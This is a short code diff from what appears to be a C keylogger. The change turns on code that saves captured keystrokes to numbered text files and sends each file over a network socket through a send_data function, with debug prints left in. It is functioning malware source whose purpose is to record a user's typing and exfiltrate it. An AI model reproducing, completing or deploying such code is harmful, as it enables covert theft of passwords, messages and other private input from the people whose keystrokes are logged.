@@ -117,29 +117,30 @@ int main(void) {
       counter = 0;
       // // read and write and whee
       // // convert int to str
-      // print_logged_keys(*package);
-      // char str[20];
-      // sprintf(str, "in_%d", file_name_counter);
-      // char* file_name = strcat(str, ".txt");
-      // FILE* package_log = fopen(file_name, "w");
-      // if (package_log == NULL) {
-      //   error_and_exit("Couldn't open package log");
-      // }
-      // keys_to_file(package_log, *package);
+      print_logged_keys(*package);
+      char str[20];
+      sprintf(str, "inp_%d", file_name_counter);
+      char* file_name = strcat(str, ".txt");
+
+      FILE* package_log = fopen(file_name, "w");
+      if (package_log == NULL) {
+        error_and_exit("Couldn't open package log");
+      }
+      keys_to_file(package_log, *package);
 
       // // call send data functoin on package_log
-      // if (package->keys_arr_size != 0) {
-      //   reset_structs(package);
-      // }
-      // ++file_name_counter;
+      if (package->keys_arr_size != 0) {
+        reset_structs(package);
+      }
+      ++file_name_counter;
 
-      // FILE* read_log = fopen("in_0.txt", "r");
-      // puts(file_name);
-      if (send_data(socket_file, "in_0.txt") != 0) {
+      puts("here 1");
+      puts(file_name);
+      fclose(package_log);
+      if (send_data(socket_file, file_name) != 0) {
         error_and_exit("what is the point");
       }
-      // fclose(package_log);
-      // fclose(read_log);
+      puts("here 2");
     }
 
     // EXIT with F12
